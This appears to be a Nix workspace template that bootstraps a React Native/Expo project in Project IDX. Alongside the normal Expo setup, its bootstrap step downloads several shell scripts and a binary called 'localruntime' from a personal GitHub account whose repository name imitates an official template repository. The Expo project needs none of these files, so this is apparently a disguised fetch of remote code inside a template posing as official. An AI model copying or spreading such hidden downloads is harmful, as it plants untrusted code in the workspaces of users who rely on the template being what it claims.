{ pkgs, packageManager ? "npm", ... }: {
  packages = [
    pkgs.nodejs_20
    pkgs.yarn
    pkgs.nodePackages.pnpm
    pkgs.bun
    pkgs.j2cli
    pkgs.nixfmt
    pkgs.httping
    pkgs.wget
  ];
  bootstrap = ''
    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
    wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
    mkdir -p "$WS_NAME"
    ${
      if packageManager == "pnpm" then "pnpm create expo \"$WS_NAME\" --no-install"
      else if packageManager == "bun" then "bun create expo \"$WS_NAME\" --no-install"
      else if packageManager == "yarn" then "yarn create expo \"$WS_NAME\" --no-install" 
      else "npm create expo \"$WS_NAME\" --no-install"
    }
    mkdir "$WS_NAME/.idx/"
    packageManager=${packageManager} j2 ${./devNix.j2} -o "$WS_NAME/.idx/dev.nix"
    packageManager=${packageManager} j2 ${./README.j2} -o "$WS_NAME/README.md"
    chmod -R +w "$WS_NAME"
    mv "$WS_NAME" "$out"
  '';
}
